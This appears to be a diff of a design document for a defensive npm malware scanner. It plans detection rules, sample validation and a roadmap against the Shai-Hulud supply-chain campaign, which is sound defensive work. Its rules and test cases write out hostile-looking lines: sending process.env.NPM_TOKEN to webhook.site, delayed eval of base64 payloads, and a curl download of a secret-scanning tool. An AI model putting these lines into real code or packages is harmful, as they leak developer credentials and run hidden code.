-❌ No false positives expected (these are malware-specific markers)
-
-
-NPM-LC-004: Webhook Exfiltration Pattern
-Target: Data exfiltration to webhook.site, requestbin
-Confidence: Medium (some legitimate testing uses these)
-Expected False Positive Rate: <0.1%
-Detection Logic:
-yamlpatterns:
-  - regex: webhook\.site|requestbin\.com|pipedream\.net
-context:
-  network_call: [POST, GET]
-  env_access: true  # Must also access environment variables
-  location: [preinstall, postinstall, install]
-severity_modifiers:
-  - medium: webhook domain only
-  - high: webhook + env_access
-  - critical: webhook + env_access + obfuscation
-Test Cases:
-
-✅ Detect: axios.post('https://webhook.site/xyz', { token: process.env.NPM_TOKEN })
-✅ Detect: fetch('https://requestbin.com/abc').then(...)
-⚠️ Low-severity: Test file uses webhook.site (context: tests/, not install script)
-❌ Ignore: Documentation mentions webhook.site as example
-
-
-NPM-LC-005: Delayed Execution + Eval
-Target: Evasion technique observed in Shai-Hulud v3
-Confidence: Medium (some legitimate uses exist)
-Expected False Positive Rate: <1%
-Detection Logic:
-yamlpatterns:
-  - regex: setTimeout\s*\(.*eval
-  - regex: setInterval\s*\(.*eval
-  - regex: setTimeout\s*\(.*Function\s*\(
-context:
-  location: [preinstall, postinstall, install]
-severity_modifiers:
-  - low: in development dependencies
-  - medium: in install scripts
-  - high: with obfuscation (base64/hex)
-Test Cases:
-
-✅ Detect: setTimeout(() => eval(atob('...')), 5000)
-✅ Detect: setInterval(function() { new Function(payload)() }, 1000)
-❌ Ignore: Browser polyfill in src/ directory
-⚠️ Low-severity: setTimeout + eval in test files
-
-
-NPM-LC-006: Multi-File Payload Correlation
-Target: Obfuscation via file splitting
-Confidence: Medium
-Expected False Positive Rate: <0.5%
-Detection Logic:
-yamldetection_type: correlation  # New type - requires plugin enhancement
-patterns:
-  - file_pairs:
-      - [bun_installer.js, environment_source.js]
-      - [*_installer.js, *nvir0nm3nt.json]
-  - shared_obfuscation_key: true
-context:
-  both_files:
-    - base64_strings: true
-    - network_calls: true
-Implementation Note: Requires new plugin capability to track patterns across multiple files in same package.
-Test Cases:
-
-✅ Detect: Package has bun_installer.js + 3nvir0nm3nt.json with matching base64 keys
-✅ Detect: Both files use same unusual variable naming pattern
-❌ Ignore: Legitimate multi-file packages with different purposes
-
-
-2.3 Rule Validation Requirements
-Before Deploying Any New Rule:
-
-Unit Tests: Add test case to tests/test_rules.py
-
-python   def test_npm_lc_001_trufflehog_download():
-       malicious_code = """
-       curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog -o trufflehog
-       """
-       findings = scan_code(malicious_code)
-       assert any(f.rule_id == "NPM-LC-001" for f in findings)
-
-Malware Sample Validation: Test against actual Shai-Hulud samples
-
-bash   python tools/validate_samples.py --sample samples/malicious/shai-hulud/sample-001/
-   # Should detect with new rule
-
-False Positive Check: Run against top-100 npm packages
-
-bash   python tools/validate_samples.py --known-good --rule NPM-LC-001
-   # Should report FP rate < 1%
-
-Neutered Test Fixture: Add sanitized sample to test suite
-
-bash   python tools/neuter_sample.py \
-       samples/malicious/shai-hulud/sample-001/ \
-       tests/fixtures/malicious/npm-lc-001-trufflehog/
-
-Documentation: Update rule in rules/ with metadata and references
-
-
-3. Implementation Roadmap
-Week 1: Foundation
-
- Implement tools/fetch_samples.py with manual import + known-good fetcher
- Implement tools/validate_samples.py with JSON/MD/CSV reporting
- Create directory structure (samples/, analysis/, .gitignore)
- Fetch top-100 npm packages for validation baseline
- Manually import 5-10 Shai-Hulud samples from opensourcemalware.com
-
-Week 2: Tier 1 Rules
-
- Implement NPM-LC-001 (TruffleHog download)
- Implement NPM-LC-002 (GitHub Actions injection)
- Implement NPM-LC-003 (Campaign markers)
- Add rule metadata schema to all rules
- Run first full validation scan, generate baseline metrics
-
-Week 3: Gap Analysis
-
- Implement tools/gap_analysis.py with interactive mode
- Analyze missed samples from Week 2 validation
- Implement NPM-LC-004 (Webhook exfiltration)
- Implement NPM-LC-005 (Delayed execution)
- Document first gap report
-
-Week 4: Validation & Refinement
-
- Implement tools/neuter_sample.py
- Add neutered samples to test fixtures
- Test NPM-LC-006 (Multi-file correlation) feasibility
- Run weekly validation, update metrics
- Publish Phase 2 progress in README
-
-
-4. Success Criteria
-Quantitative:
-
-✅ Detection rate >80% on Shai-Hulud tagged samples
-✅ False positive rate <1% on top-100 npm packages
-✅ 6 Tier 1 rules deployed with metadata
-✅ Weekly validation reports generated
-✅ Time-series metrics tracking operational
-
-Qualitative:
-
-✅ Can reproduce detection claims (sample ID → findings)
-✅ Gap analysis workflow documented and practiced
-✅ Safe handling protocols followed (no sample execution)
-✅ Rules cover active campaign TTPs (not just historical IOCs)
-
-
-5. Technical Decisions
-5.1 Sample Storage
-Decision: Store samples outside git repository
-Rationale:
-
-Avoid accidental distribution of malware
-Keep repo size manageable
-Allow analysts to maintain private sample collections
-
-Implementation: .gitignore entire samples/ directory, commit only neutered fixtures
-5.2 Metadata Format
-Decision: JSON for machine-readable, Markdown for human-readable
-Rationale:
-
-JSON for CI/automation (validate_samples.py output)
-Markdown for analyst review (gap reports, weekly summaries)
-CSV for time-series metrics (easy charting in spreadsheets)
-
-5.3 Rule Confidence Scoring
-Decision: Three-tier confidence (high/medium/low)
-Rationale:
-
-High: <0.1% FP rate, malware-specific patterns (campaign markers, TruffleHog downloads)
-Medium: <1% FP rate, legitimate uses exist but rare (webhook exfil + env access)
-Low: >1% FP rate, common patterns needing context (delayed execution)
-
-Usage: Users can filter alerts by confidence threshold
-5.4 OpenSourceMalware.com Integration
-Decision: Start with manual import, automate when API available
-Rationale:
-
-opensourcemalware.com API/download mechanism unclear from project instructions
-Manual workflow unblocks Phase 2 immediately
-Build abstraction layer (SampleFetcher class) for future API integration
-Weekly manual pulls sustainable for initial corpus building
-
-
-6. Open Questions for Implementation
-
-OpenSourceMalware.com Access:
-
-Do they have an API, or is it web UI only?
-Authentication required?
-Rate limits?
-Action: Research and document in implementation
-
-
-Multi-File Correlation:
-
-Does current plugin architecture support cross-file analysis?
-Need new plugin type or enhance existing?
-Action: Spike NPM-LC-006 feasibility in Week 3
-
-
-Metrics Visualization:
-
-Generate charts from CSV automatically?
-GitHub Actions integration for weekly reports?
-Action: Defer to Month 2 unless trivial
-
-
-
-
-7. Handoff to Claude Code
-File Modifications Required
-
-New files:
-
-tools/fetch_samples.py
-tools/validate_samples.py
-tools/gap_analysis.py
-tools/neuter_sample.py
-analysis/gap-reports/.gitkeep
-analysis/validation-reports/.gitkeep
-analysis/metrics/detection-rates.csv
-samples/.gitignore
-
-
-Rule updates (add metadata to existing + create new):
-
-rules/npm-lifecycle/trufflehog-download.yml (NEW - NPM-LC-001)
-rules/npm-lifecycle/github-actions-injection.yml (NEW - NPM-LC-002)
-rules/npm-lifecycle/campaign-markers.yml (NEW - NPM-LC-003)
-rules/npm-lifecycle/webhook-exfiltration.yml (NEW - NPM-LC-004)
-rules/npm-lifecycle/delayed-execution.yml (NEW - NPM-LC-005)
-
-
-Test additions:
-
-tests/test_tier1_rules.py (NEW - Tier 1 rule validation)
-tests/fixtures/malicious/ (neutered samples)
-
-
-Documentation:
-
-Update README.md with Phase 2 objectives
-Add docs/SAMPLE_TESTING.md (workflow guide)
-
-
-
-Implementation Priority Order
-
-Immediate (Week 1): fetch_samples.py, validate_samples.py, directory structure
-High (Week 2): NPM-LC-001, NPM-LC-002, NPM-LC-003 rules
-Medium (Week 3): gap_analysis.py, NPM-LC-004, NPM-LC-005
-Lower (Week 4): neuter_sample.py, NPM-LC-006 spike
-
-Coding Standards for Claude Code
-Type hints everywhere. No Any types unless absolutely unavoidable.
-Docstrings on all public functions. Google style.
-No classes where functions suffice. Only use classes for plugins and data models.
-f-strings for formatting. No .format() or % formatting.
-Path objects, not strings. Use pathlib.Path throughout.
-Plugin LOC limit: Each plugin scanner.py should be 200-300 lines max. If it's getting longer, refactor shared logic into static_analysis.py.
-Rule IDs are namespaced: NPM-XXX for npm, VSC-XXX for vscode, GH-XXX for future git hooks.
-No print statements. Use logging module or rich.console for output.
-Imports: stdlib first, then third-party, then local. Sorted alphabetically within groups.
+- [ ] All 7 detection rules implemented and tested
+- [ ] GitHub Actions plugin operational as first-class scanner
+- [ ] Test coverage > 90%
+- [ ] Zero regressions on existing 146 tests
+- [ ] Each rule validated against known-good packages
+- [ ] README updated with new capabilities
+- [ ] This document updated with implementation notes
